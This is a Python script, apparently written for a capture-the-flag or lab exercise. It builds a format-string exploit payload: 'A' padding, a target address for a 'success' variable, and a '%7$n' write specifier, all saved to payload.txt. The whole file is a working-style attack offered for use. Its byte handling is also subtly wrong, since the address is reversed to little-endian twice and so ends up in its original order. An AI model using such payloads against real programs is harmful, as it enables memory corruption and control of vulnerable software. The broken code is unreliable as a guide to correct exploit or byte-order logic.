def to_little_endian(hex_str):
    """
    Convert a hexadecimal string to its little-endian representation.

    Parameters:
    hex_str (str): The hexadecimal string to convert.

    Returns:
    str: The little-endian representation of the input hexadecimal string.
    """
    # Ensure the input string has an even number of characters
    if len(hex_str) % 2 != 0:
        hex_str = '0' + hex_str

    # Convert the string to bytes
    bytes_repr = bytes.fromhex(hex_str)

    # Reverse the bytes to get the little-endian representation
    little_endian_repr = bytes_repr[::-1]

    # Convert the bytes back to a hexadecimal string
    little_endian_hex = little_endian_repr.hex()

    return little_endian_hex


def generate_payload(address, offset):
    # Convert the address to little-endian format
    address_le = bytes.fromhex(address)[::-1]

    # Calculate the padding needed to make the number of characters printed so far equal to 0x54 ('T')
    padding_length = 0x54 - len(address_le)
    padding = b'A' * padding_length

    # Construct the payload
    payload = padding + address_le + b'%' + str(offset).encode() + b'$n'

    return payload


# Replace with the actual address of the 'success' variable (in hex) and the correct offset
address = to_little_endian('ffffd0a8')
offset = 7

# Generate the payload
payload = generate_payload(address, offset)
with open("payload.txt", "wb") as f:
    f.write(payload)
